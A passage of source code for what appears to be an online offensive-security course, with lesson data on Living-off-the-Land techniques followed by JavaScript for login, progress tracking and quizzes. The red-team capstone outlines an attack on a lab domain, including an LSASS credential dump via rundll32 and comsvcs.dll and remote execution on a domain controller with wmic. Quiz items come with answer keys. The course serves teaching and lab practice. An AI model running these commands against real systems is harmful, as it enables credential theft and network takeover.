                        "correct": 2,
                        "explanation": "This is the core problem. Because the attacker is using legitimate tools, a defender cannot simply block the tool; they must analyze the context and behavior to spot the malicious intent."
                    },
                    {
                        "id": 2,
                        "question": "Which of the following is a critical log source for detecting PowerShell-based LotL attacks?",
                        "options": [
                            "Firewall logs.",
                            "PowerShell Script Block Logging.",
                            "DNS logs.",
                            "Web proxy logs."
                        ],
                        "correct": 1,
                        "explanation": "Script Block Logging is essential. It records the actual content of PowerShell scripts as they are executed, even if they are obfuscated or run entirely in memory. This gives defenders visibility into what the attacker is actually doing."
                    },
                    {
                        "id": 3,
                        "question": "A detection rule that looks for Microsoft Word spawning a PowerShell process is an example of what?",
                        "options": [
                            "A signature-based detection.",
                            "A behavioral detection that focuses on parent-child process relationships.",
                            "A machine learning-based detection.",
                            "A network-based detection."
                        ],
                        "correct": 1,
                        "explanation": "This is a classic behavioral rule. It's not normal for a word processor to launch a powerful scripting engine. This suspicious parent-child relationship is a very strong indicator of a malicious macro being executed."
                    }
                ]
            }
        },
        {
            "id": "lesson-30",
            "title": "Capstone: Red Team LotL Challenge",
            "duration": "120 min",
            "objectives": [
                "Apply the knowledge from the entire course to a practical scenario",
                "Plan and execute a multi-stage attack using only LotL techniques",
                "Navigate a complex lab environment under strict constraints",
                "Document and report on a pure LotL engagement"
            ],
            "content": {
                "overview": "This final lesson is a capstone challenge where you will put everything you have learned into practice. You will be given access to a starting host in a multi-machine lab environment and a clear objective. The catch: you must achieve the objective using *only* the built-in, native tools on the operating systems. No custom binaries, no third-party tools, no Metasploit. This is the ultimate test of a LotL operator.",
                "sections": [
                    {
                        "title": "The Scenario and Constraints",
                        "content": "<p>Students will be given credentials to a standard user account on a Windows 10 workstation in a simulated corporate Active Directory environment.</p><h3>Objective:</h3><p><em>'From your starting host, find and retrieve the content of the file located at `C:\\Secrets\\flag.txt` on the Domain Controller.'</em></p><h3>The Golden Rule:</h3><p>You may not upload or download any executable files. Your entire attack chain must be constructed using only the binaries and scripts that are pre-installed on the Windows and Windows Server virtual machines in the lab. (This includes PowerShell, CMD, and all the LOLBins we have studied).</p>",
                        "image": "https://images.unsplash.com/photo-1521791136064-7986c2920216?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Expected Attack Path",
                        "content": "<p>A successful student will need to chain together many of the techniques learned in this course:</p><ol><li>Perform initial host and network reconnaissance using `whoami`, `ipconfig`, `net.exe`, `dsquery.exe`, etc.</li><li>Find and exploit a local privilege escalation vulnerability on the starting workstation.</li><li>Dump LSASS memory using the `comsvcs.dll` technique.</li><li>Analyze the dump offline (simulated) to find the credentials for a Domain Admin.</li><li>Use those credentials with `wmic.exe` or `schtasks.exe` to move laterally to the Domain Controller.</li><li>On the Domain Controller, access the target file and exfiltrate its content (e.g., by printing it to the screen and copying the text, or by using a DNS-based covert channel).</li></ol>",
                        "image": "https://i.imgur.com/8a6R2aU.png"
                    },
                    {
                        "title": "Final Deliverable",
                        "content": "<p>The final deliverable is a professional report that details the step-by-step narrative of the attack, with screenshots as evidence for each step. The report should also include a list of recommendations for the fictional company on how they could have detected and prevented this pure LotL attack chain.</p>",
                        "image": "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Capstone Attack Plan",
                    "language": "markdown",
                    "code": "# Capstone Project - Attack Plan Outline\n\n1.  **Initial Recon (CMD Tools):**\n    -   `whoami`, `ipconfig`, `net user`, `net group \"Domain Admins\" /domain`\n    -   Identify DC and user targets.\n2.  **Local PrivEsc (Find the Vector):**\n    -   Manually search for weak service permissions, unquoted paths, etc.\n    -   Execute bypass to get SYSTEM on initial host.\n3.  **Credential Access (LotL Dump):**\n    -   `tasklist` to get LSASS PID.\n    -   `rundll32.exe comsvcs.dll, MiniDump` to dump LSASS.\n4.  **Lateral Movement (LotL Remote Exec):**\n    -   (Simulate offline cracking) Use found DA creds.\n    -   `wmic.exe /node:DC01 process call create \"powershell ...\"` to get shell on DC.\n5.  **Objective:**\n    -   `type C:\\Secrets\\flag.txt`"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary constraint of the capstone challenge?",
                        "options": [
                            "There is a very short time limit.",
                            "The student must use Metasploit for everything.",
                            "The student must achieve the objective using only the native, built-in tools of the operating system.",
                            "The student is not allowed to use PowerShell."
                        ],
                        "correct": 2,
                        "explanation": "This constraint forces the student to demonstrate a true mastery of Living off the Land techniques, which is the entire point of the course."
                    },
                    {
                        "id": 2,
                        "question": "In the capstone scenario, which LotL technique would be used for the 'Credential Access' phase?",
                        "options": [
                            "Running `Mimikatz.exe`.",
                            "Using `dsquery.exe`.",
                            "Dumping the LSASS process memory using `rundll32.exe` and `comsvcs.dll`.",
                            "Using `net.exe`."
                        ],
                        "correct": 2,
                        "explanation": "Since no custom binaries are allowed, the student must use the built-in system tools to perform the LSASS dump, making the `comsvcs.dll` technique the correct choice."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of the final report in the capstone project?",
                        "options": [
                            "It is not important.",
                            "To demonstrate the student's ability to document their actions professionally and to translate their technical findings into actionable defensive recommendations.",
                            "To serve as a list of commands.",
                            "To get a grade."
                        ],
                        "correct": 1,
                        "explanation": "In a real-world engagement, the report is the final product. The capstone project simulates this by requiring a professional-quality report that details the attack narrative and provides value to the fictional client."
                    }
                ]
            }
        }
    ]
}
      // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
        timeStarted: null,
        timeCompleted: null,
        currentQuestionIndex: 0,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        lastActive: new Date(),
        interactions: 0,
        completedSections: [],
        totalTime: 0,
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
      async function loadUserProfile() {
        try {
          // 🔍 Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            // 🆕 Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            // ✅ Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error("❌ Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "✓";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "◐";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard.html";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
